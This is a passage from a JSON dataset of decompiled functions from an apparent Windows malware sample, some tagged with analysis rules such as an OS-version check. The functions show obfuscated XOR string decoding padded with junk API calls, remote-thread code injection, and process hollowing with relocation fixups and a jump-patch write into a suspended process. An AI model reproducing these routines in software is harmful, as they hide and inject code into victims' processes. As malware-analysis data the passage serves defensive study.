        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040991b(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    code *pcVar11;\n    int16_t *piVar12;\n    uint uVar13;\n    int32_t *piVar14;\n    int64_t iVar15;\n    uint uVar16;\n    int16_t *piVar17;\n    int32_t *piStack184;\n    int32_t iStack180;\n    int32_t *piStack176;\n    int32_t *piStack172;\n    uchar *puVar18;\n    uint uStack156;\n    uchar *puStack152;\n    uint uStack148;\n    ushort uStack144;\n    uchar uStack142;\n    uint uStack141;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar *puStack132;\n    uint8_t auStack128 [4];\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    int16_t *piStack108;\n    uint uStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uint uStack72;\n    int32_t iStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    ushort uStack44;\n    int32_t iStack36;\n    int32_t *piStack16;\n    uint uStack12;\n    \n    piStack172 = 0x409930;\n    cVar4 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack124 = 0;\n    piVar14 = arg_8h + 1;\n    piStack16 = piVar14;\n    if (*piVar14 != 0) {\n        piStack172 = *piVar14;\n        piStack176 = 0x409952;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar14 = 0;\n    }\n    iVar15 = CONCAT44(uStack120, piStack108);\n    uVar13 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41dd74 & 1) != 0)) {\n        puStack52 = 0x5;\n        if (cVar4 == '\\x05') {\n            if ((*0x41e1e0 | *0x41e1e4) == 0) {\n                piStack172 = 0x40999d;\n                fcn.0040c4dc();\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piStack172 = 0xb;\n                piStack176 = 0x8;\n                uStack144 = 0x210d;\n                uStack12 = 6;\n                uStack142 = 6;\n                uStack141 = 0x7401d55;\n                uStack137 = 0x39;\n                uStack136 = 0xe;\n                uStack135 = 0x39;\n                puStack152 = 0x39625563;\n                uStack148 = CONCAT22(uStack148._2_2_, 0x6e71);\n                iStack180 = 0x4099e1;\n                iStack180 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                piStack184 = 0x4099e8;\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                uStack141 = uStack141 & 0xff;\n                uStack137 = 0;\n                puStack56 = &stack0xffffff64 + -iVar5;\n                iStack60 = iVar5;\n                do {\n                    piStack184 = 0x409a0a;\n                    iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                    if (iVar6 != 0x7d2cca) {\n                        puVar1 = CONCAT13(uStack137, uStack141._1_3_) + iVar5;\n                        *puVar1 = (&stack0xffffff5c)[CONCAT13(uStack137, uStack141._1_3_) % 6] ^ puVar1[puStack56];\n                    }\n                    iVar6 = CONCAT13(uStack137, uStack141._1_3_) + 1;\n                    uStack141 = uStack141 & 0xff | iVar6 * 0x100;\n                    uStack137 = iVar6 >> 0x18;\n                } while (iVar6 < 10);\n                piStack184 = 0xc;\n                uStack156 = 0x203c3278;\n                puStack152 = 0x12501b3b;\n                uStack148 = uStack148 & 0xff000000 | 0x540022;\n                uVar10 = 0x7a54;\n                uVar13 = (*pcVar11)();\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n                iVar6 = 0;\n                puStack152 = &stack0xffffff58 + -iVar5;\n                uVar13 = 0xffffffff;\n                iStack68 = iVar5;\n                do {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    uVar16 = uStack72;\n                    if (iVar7 != 0xa8f3e2) {\n                        *(iVar6 + iVar5) = (&stack0xffffff50)[iVar6 % iStack36] ^ (iVar6 + iVar5)[puStack152];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xb);\n                iVar15 = fcn.0040c9e0(iVar5);\n                if (iVar15 != 0) {\n                    uVar16 = 8;\n                    uStack64 = 0x531c6b29;\n                    iStack60 = 0x6b2c471f;\n                    puStack56 = 0x4701531c;\n                    puStack52 = 0x53186b20;\n                    iStack48 = 0x6b27471e;\n                    uStack44 = 0x5379;\n                    uStack141 = uStack141 & 0xff | 0x796b4200;\n                    uStack137 = 0x53;\n                    uStack136 = 0x6d;\n                    uStack135 = 0x47;\n                    uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                    uStack120 = iVar15 >> 0x20;\n                    piStack108 = iVar15;\n                    piVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                    uStack120 = iVar15 >> 0x20;\n                    piStack108 = iVar15;\n                    iVar6 = 0;\n                    piVar17 = piVar8;\n                    do {\n                        iVar7 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                        iVar5 = iStack80;\n                        uStack120 = iVar15 >> 0x20;\n                        piStack108 = iVar15;\n                        if (iVar7 != 0x1b713) {\n                            *(iVar6 + piVar8) =\n                                 (&stack0xffffff68)[iVar6 % iStack48] ^ (iVar6 + piVar8)[&stack0xffffffb4 + -piVar8];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x16);\n                    uStack104 = piVar8 >> 0x1f;\n                    piVar12 = piVar8;\n                    do {\n                        iVar2 = *piVar12;\n                        piVar12 = piVar12 + 1;\n                    } while (iVar2 != uVar10);\n                    iVar2 = (piVar12 - (piVar8 + 1) >> 1) * 2;\n                    uStack112 = 0;\n                    uStack116 = CONCAT22(iVar2 + 2, iVar2);\n                    piStack108 = piVar8;\n                    iVar6 = fcn.00410460(uStack120, puStack132, 4, 0, 0, 0, 0, 0, &stack0xffffff8c, \n                                         &stack0xffffff8c >> 0x1f, &stack0xffffff4c, &stack0xffffff4c >> 0x1f, uVar13, \n                                         uVar16);\n                    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar6 < 0) {\n                        uVar13 = fcn.00401000();\n                    }\n                    else {\n                        puStack152 = 0x1f402d52;\n                        uStack148 = 0x532a555d;\n                        uStack144 = 0x5d02;\n                        uStack142 = 0x39;\n                        uStack156 = CONCAT31(uStack156._1_3_, 0x38);\n                        uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                        uVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n                        piStack176 = NULL;\n                        puStack132 = &stack0xffffff5c + -uVar9;\n                        uStack144 = uVar9;\n                        uStack142 = uVar9 >> 0x10;\n                        uStack141 = uStack141 & 0xffffff00 | uVar9 >> 0x18;\n                        piVar8 = piVar17;\n                        do {\n                            iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                            if (iVar5 != 0xbd2566) {\n                                *(piStack176 + uVar9) =\n                                     (&stack0xffffff54)[piStack176 % iStack100] ^ (piStack176 + uVar9)[puStack132];\n                            }\n                            piStack176 = piStack176 + 1;\n                        } while (piStack176 < 0xb);\n                        uStack156 = 0x2013353e;\n                        puStack152 = 0x2283b3a;\n                        uStack148 = uStack148 & 0xff000000 | 0x530a24;\n                        piStack172 = 0x536e4567;\n                        uVar13 = (*pcVar11)(8, 0x14);\n                        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n                        iVar6 = 0;\n                        puVar18 = &stack0xffffff50 + -iVar5;\n                        uStack144 = SUB42(puVar18, 0);\n                        uStack142 = puVar18 >> 0x10;\n                        uStack141 = uStack141 & 0xffffff00 | puVar18 >> 0x18;\n                        do {\n                            iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n                            uVar10 = uStack156;\n                            if (iVar7 != 0xd60c0) {\n                                *(iVar6 + iVar5) = (&stack0xffffff48)[iVar6 % uStack112] ^ (iVar6 + iVar5)[puVar18];\n                            }\n                            iVar6 = iVar6 + 1;\n                        } while (iVar6 < 0x13);\n                        uVar13 = 0xffffffff;\n                        *0x41e1e0 = fcn.0040c9e0(iVar5);\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                        uVar10 = (*pcVar11)(0, uVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n                        iVar5 = iStack80;\n                    }\n                    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar8);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n                    iVar15 = CONCAT44(uStack120, piStack108);\n                    uVar16 = uStack72;\n                }\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                uStack120 = iVar15 >> 0x20;\n                piStack108 = iVar15;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n                uStack120 = iVar15 >> 0x20;\n                piStack108 = iVar15;\n                uVar10 = (*pcVar11)(0, uVar16);\n                uStack120 = iVar15 >> 0x20;\n                piStack108 = iVar15;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n                uStack120 = iVar15 >> 0x20;\n                piStack108 = iVar15;\n                piVar14 = piStack16;\n                if (*0x41e1e0 == 0) goto code_r0x0040a166;\n            }\n            *0x41e1e4 = *0x41e1e0 >> 0x20;\n            piStack176 = arg_8h + 3;\n            piStack172 = piStack176 >> 0x1f;\n            iStack180 = 0;\n            piStack184 = NULL;\n            iVar5 = fcn.00410460(*0x41e1e0, *0x41e1e4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                                 lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n            uStack120 = iVar15 >> 0x20;\n            piStack108 = iVar15;\n            *piVar14 = iVar5;\n            if (iVar5 == 0) goto code_r0x0040a166;\n        }\n        else {\n            piStack184 = piVar14;\n            if ((*0x41e1e8 | *0x41e1ec) == 0) {\n                piStack172 = 0xb;\n                piStack176 = 0x8;\n                uStack144 = 0x210d;\n                uStack142 = 6;\n                uStack141 = 0x7401d55;\n                uStack137 = 0x39;\n                uStack136 = 0xe;\n                uStack135 = 0x39;\n                uStack116 = 0x39625563;\n                uStack112 = CONCAT22(uStack112._2_2_, 0x6e71);\n                iStack180 = 0x409e14;\n                iStack180 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                piStack184 = 0x409e1b;\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar6 = 0;\n                puVar18 = &stack0xffffff64 + -iVar5;\n                iStack96 = iVar5;\n                do {\n                    piStack184 = 0x409e38;\n                    iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                    if (iVar7 != 0x7d2cca) {\n                        *(iVar6 + iVar5) = (&stack0xffffff80)[iVar6 % 6] ^ (iVar6 + iVar5)[puVar18];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                piStack184 = 0x15;\n                uStack92 = 0x2c3a1c21;\n                uStack88 = 0x2209164a;\n                uStack84 = 0xd006d0a;\n                iStack80 = 0x1503b24;\n                iStack76 = 0x380b370d;\n                piStack108 = 0x6f566873;\n                uStack104 = CONCAT31(uStack104._1_3_, 0x38);\n                uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n                iVar6 = 0;\n                piStack176 = &stack0xffffff98 + -iVar5;\n                uVar13 = 0xffffffff;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetCursor)();\n                    if (iVar7 != 0x572505) {\n                        *(iVar6 + iVar5) = (&stack0xffffff88)[iVar6 % iStack76] ^ (iVar6 + iVar5)[piStack176];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x14);\n                fcn.0040c4dc();\n                uVar10 = piStack108;\n                *0x41e1e8 = fcn.0040c9e0(iVar5);\n                uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                pcVar11 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar10);\n                (*pcVar11)(uVar10);\n                piStack184 = piStack16;\n                if (*0x41e1e8 == 0) goto code_r0x0040a166;\n            }\n            *0x41e1ec = *0x41e1e8 >> 0x20;\n            uVar13 = 0xffffffff;\n            piStack176 = &stack0xffffff70;\n            piStack172 = piStack176 >> 0x1f;\n            iStack180 = piStack184 >> 0x1f;\n            iVar5 = fcn.00410460(*0x41e1e8, *0x41e1ec, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            if (iVar5 < 0) goto code_r0x0040a166;\n        }\n    }\n    else {\n        puStack52 = 0x5;\n        if (cVar4 != '\\x05') {\n            piStack172 = 0xb;\n            piStack176 = 0x8;\n            iStack96 = 0x5506210d;\n            uStack92 = 0x3907401d;\n            uStack88 = CONCAT22(uStack88._2_2_, 0x390e);\n            uStack116 = 0x39625563;\n            uStack112 = CONCAT22(uStack112._2_2_, 0x6e71);\n            iStack180 = 0x40a007;\n            iStack180 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            piStack184 = 0x40a00e;\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iStack60 = 0;\n            puVar18 = &stack0xffffff94 + -iVar5;\n            iStack96 = iVar5;\n            do {\n                iVar6 = iStack60;\n                piStack184 = 0x40a02c;\n                iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                if (iVar7 != 0x7d2cca) {\n                    piStack184 = 0x6;\n                    *(iVar6 + iVar5) = (&stack0xffffff80)[iVar6 % 6] ^ (iVar6 + iVar5)[puVar18];\n                    iVar6 = iStack60;\n                }\n                iStack60 = iVar6 + 1;\n            } while (iStack60 < 10);\n            piStack184 = 0x15;\n            uStack92 = 0x2c3a1c21;\n            iVar6 = 0;\n            uStack88 = 0x2209164a;\n            uStack84 = 0xd006d0a;\n            iStack80 = 0x1503b24;\n            iStack76 = 0x380b370d;\n            piStack108 = 0x6f566873;\n            uStack104 = CONCAT31(uStack104._1_3_, 0x38);\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n            piStack176 = &stack0xffffff98 + -iVar5;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_GetCursor)();\n                uVar10 = piStack108;\n                if (iVar7 != 0x572505) {\n                    *(iVar6 + iVar5) = (&stack0xffffff88)[iVar6 % iStack76] ^ (iVar6 + iVar5)[&stack0xffffff98 + -iVar5]\n                    ;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x14);\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(piStack108, iVar5);\n            pcVar11 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar13);\n            puVar3 = puStack52;\n            uVar13 = 0xffffffff;\n            if (pcVar11 != NULL) {\n                iVar6 = (*pcVar11)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puStack52, &stack0xffffff4c);\n                if (iVar6 < 0) {\n                    uVar13 = fcn.00401000();\n                }\n                else {\n                    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar3, 30000);\n                    if (iVar6 == 0) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar3, &stack0xffffff44);\n                    }\n                    uVar13 = 0;\n                }\n            }\n            uVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            pcVar11 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar16);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar10);\n            (*pcVar11)(uVar10);\n            goto code_r0x0040a166;\n        }\n        piStack172 = arg_8h + 3;\n        piStack176 = NULL;\n        iStack180 = lpParameter;\n        piStack184 = lpStartAddress;\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0);\n        *piVar14 = iVar5;\n        if (iVar5 == 0) {\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x0040a166;\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar5, 30000);\n        if (iVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar14, &stack0xffffff44);\n        }\n    }\n    uVar13 = 0;\ncode_r0x0040a166:\n    *0x41e1ec = *0x41e1e8 >> 0x20;\n    *0x41e1e4 = *0x41e1e0 >> 0x20;\n    return uVar13;\n}\n",
        "token_count": 5303
    },
    "0040a16f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a16f(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *unaff_EDI;\n    uchar *puVar14;\n    uchar *puStack1016;\n    int32_t *piStack1012;\n    uint uStack1008;\n    uchar *puStack1004;\n    uint uStack1000;\n    uchar *puStack992;\n    uchar *puStack988;\n    uint uStack984;\n    uchar *puStack980;\n    uchar *puStack976;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    int32_t iStack928;\n    uint32_t uStack924;\n    uint32_t uStack920;\n    int32_t iStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack904;\n    uint uStack900;\n    uint32_t uStack896;\n    int32_t iStack892;\n    uchar uStack888;\n    uint uStack887;\n    ushort uStack883;\n    uchar uStack881;\n    uchar uStack880;\n    uint uStack879;\n    uint uStack875;\n    ushort uStack871;\n    uchar uStack869;\n    uchar uStack868;\n    uint uStack867;\n    uint32_t uStack863;\n    uint32_t uStack859;\n    uchar uStack855;\n    uint uStack852;\n    uint uStack844;\n    uchar auStack840 [28];\n    uint uStack812;\n    uint uStack804;\n    uchar auStack740 [88];\n    int32_t iStack652;\n    int32_t iStack636;\n    \n    uStack948 = 0x208;\n    uStack952 = 8;\n    uStack956 = 0x40a193;\n    uStack956 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    uStack960 = 0x40a19c;\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    uStack900 = 0x74213449;\n    uStack852 = 0;\n    iStack928 = 0;\n    uStack924 = uStack924 & 0xffffff00;\n    uStack920 = 0;\n    uStack908 = 0;\n    uStack844 = 0;\n    puVar13 = &stack0xfffffcd4;\n    for (iVar11 = 0x44; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack812 = 0x44;\n    puVar13 = &stack0xfffffcb8;\n    for (iVar11 = 0x10; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack896 = 0x341f5600;\n    uStack888 = 1;\n    puVar13 = &stack0xfffffd1c;\n    for (iVar11 = 0x2cc; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uStack887 = 0x16742034;\n    uStack883 = 0x356;\n    for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    uStack960 = 0x5d;\n    uStack964 = 8;\n    uStack904 = 6;\n    uStack880 = 6;\n    iStack892 = 0x561c7406;\n    uStack881 = 0x34;\n    uStack879 = 0x30565c74;\n    uStack875 = 0x742134;\n    uStack871 = 0x1f56;\n    uStack869 = 0x34;\n    uStack867 = 0x1561c74;\n    uStack863 = 0x4b744134;\n    uStack859 = 0x72343056;\n    uStack855 = 0x74;\n    iStack916 = 0x7472346c;\n    uStack912 = CONCAT22(uStack912._2_2_, 0x5679);\n    uStack968 = 0x40a284;\n    uStack868 = uStack880;\n    uStack968 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack972 = 0x40a287;\n    uVar5 = (*pcVar3)();\n    iVar11 = 0;\n    uStack863 = uStack863 & 0xffffff | uVar5 << 0x18;\n    uStack859 = uStack859 & 0xff000000 | uVar5 >> 8;\n    do {\n        uStack972 = 0x40a29d;\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0xec083d) {\n            *(iVar11 + uVar5) = (&stack0xfffffc60)[iVar11 % iStack916] ^ (iVar11 + uVar5)[&stack0xfffffc70 + -uVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x2e);\n    uStack972 = 0x104;\n    uStack984 = 0x40a2ce;\n    puStack980 = uVar5;\n    puStack976 = unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uStack984 = uStack964;\n    puStack992 = 0x40a2db;\n    puStack988 = unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    puStack992 = 0x4117bc;\n    uStack1000 = 0x40a2e3;\n    (*pcVar3)();\n    uStack1000 = arg_8h;\n    uStack1008 = 0x40a2e9;\n    puStack1004 = unaff_EDI;\n    (*pcVar3)();\n    uStack1008 = 0x4117c4;\n    puStack1016 = 0x40a2f1;\n    piStack1012 = unaff_EDI;\n    (*pcVar3)();\n    pcVar3 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while( true ) {\n        puStack1016 = &stack0xfffffc80;\n        iVar11 = (*pcVar3)(0, unaff_EDI, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc9c);\n        if (iVar11 != 0) break;\n        piStack1012 = 0x3e8;\n        puStack1016 = 0x40a304;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    puStack1016 = NULL;\n    piStack1012 = unaff_EDI;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uStack804 = 0x10002;\n    puVar4 = uStack1008[0xf] + uStack1008;\n    puStack980 = puVar4;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack900, &stack0xfffffcdc);\n    if (iVar11 != 0) {\n        uStack1008 = *(puVar4 + 0x50);\n        iVar11 = fcn.00401518(&stack0xfffffc2c);\n        if ((iVar11 == 0) && (iVar11 = fcn.00401270(&stack0xfffffc64),  iVar11 == 0)) {\n            puVar13 = puStack992;\n            if (puStack992 != NULL) {\n                for (; uStack1008 != NULL; uStack1008 = uStack1008 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                puVar13 = puStack1016;\n                puVar14 = puStack992;\n                for (iVar11 = *(puVar4 + 0x54); iVar11 != 0; iVar11 = iVar11 + -1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                puStack1004 = NULL;\n                if (*(puVar4 + 6) != 0) {\n                    piStack1012 = puVar4 + *(puVar4 + 0x14) + 0x24;\n                    do {\n                        iVar11 = piStack1012[1];\n                        if (iVar11 != 0) {\n                            puVar13 = puStack1016 + *piStack1012;\n                            puVar14 = puStack992 + *piStack1012;\n                            for (; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar14 = *puVar13;\n                                puVar13 = puVar13 + 1;\n                                puVar14 = puVar14 + 1;\n                            }\n                        }\n                        piStack1012 = piStack1012 + 10;\n                        puStack1004 = puStack1004 + 1;\n                    } while (puStack1004 < *(puVar4 + 6));\n                }\n                iVar11 = 0xa0;\n                if (*(puVar4 + 4) == -0x799c) {\n                    iVar11 = 0xb0;\n                }\n                piStack1012 = uStack924 - *(puVar4 + 0x34);\n                uStack896 = uStack924 - *(puVar4 + 0x34);\n                iStack892 = (uStack924 >> 0x1f) - (uStack924 < *(puVar4 + 0x34));\n                uStack1008 = puStack1016 + *(puVar4 + iVar11);\n                if ((*(puVar4 + iVar11) != 0) && (puStack976 = *(puVar4 + iVar11 + 4),  puStack976 != NULL)) {\n                    for (; 0x8 < puStack976; puStack976 = puStack976 + -*piVar12) {\n                        puStack1004 = uStack1008[1] - 8U >> 1;\n                        iVar11 = *uStack1008;\n                        if ((uStack1008[1] <= puStack976) && (puStack1004 != NULL)) {\n                            piVar12 = uStack1008 + 2;\n                            puVar4 = puStack1004;\n                            do {\n                                uVar2 = *piVar12;\n                                puStack1016 = uVar2 >> 0xc;\n                                if (puStack1016 == 0x3) {\n                                    *(puStack992 + (uVar2 & 0xfff) + iVar11) =\n                                         piStack1012 + *(puStack992 + (uVar2 & 0xfff) + iVar11);\n                                }\n                                else if (puStack1016 == 0xa) {\n                                    uVar8 = uVar2 & 0xfff;\n                                    puVar1 = puStack992 + uVar8 + iVar11;\n                                    uVar5 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack896;\n                                    *(puStack992 + uVar8 + 4 + iVar11) =\n                                         *(puStack992 + uVar8 + 4 + iVar11) + iStack892 + CARRY4(uVar5, uStack896);\n                                }\n                                piVar12 = piVar12 + 2;\n                                puVar4 = puVar4 + -1;\n                            } while (puVar4 != NULL);\n                        }\n                        piVar12 = uStack1008 + 1;\n                        uStack1008 = uStack1008 + uStack1008[1];\n                        puVar4 = puStack988;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar6 = *(puVar4 + 0x28) + iStack928;\n                iVar11 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(iStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                pcVar3 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                uVar5 = uStack920;\n                if (iVar11 != 0) {\n                    iVar11 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc18, 1);\n                    if (iVar11 == 0) {\n                        uStack1008._0_1_ = 0xe9;\n                    }\n                    uStack1008 = uStack1008 & 0xffffff00 | uStack1008;\n                    iVar9 = (*pcVar3)(&stack0xfffffc11, 4);\n                    iVar11 = iStack928;\n                    if (iVar9 == 0) {\n                        uVar5 = (iVar6 - iStack636) - 5;\n                        puStack1016 = puStack1016 & 0xff | uVar5 * 0x100;\n                        piStack1012 = piStack1012 & 0xffffff00 | uVar5 >> 0x18;\n                    }\n                    iVar6 = 0;\n                    do {\n                        iVar9 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                          (iVar11, iVar6 + iStack652, &stack0xfffffc08 + iVar6, 1, 0);\n                        if (iVar9 == 0) break;\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(uStack924);\n                    iStack916 = 1;\n                    uVar5 = uStack920;\n                }\n                goto code_r0x0040a5d4;\n            }\n        }\n        else {\ncode_r0x0040a5d4:\n            if (puStack992 != NULL) {\n                fcn.004013d8();\n            }\n        }\n        if (puStack980 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puStack980);\n        }\n        if (iStack916 != 0) goto code_r0x0040a61b;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack912, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack920);\ncode_r0x0040a61b:\n    uVar7 = uStack912;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    return uVar7;\n}\n",
        "token_count": 3466
    },
    "0040ab33": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
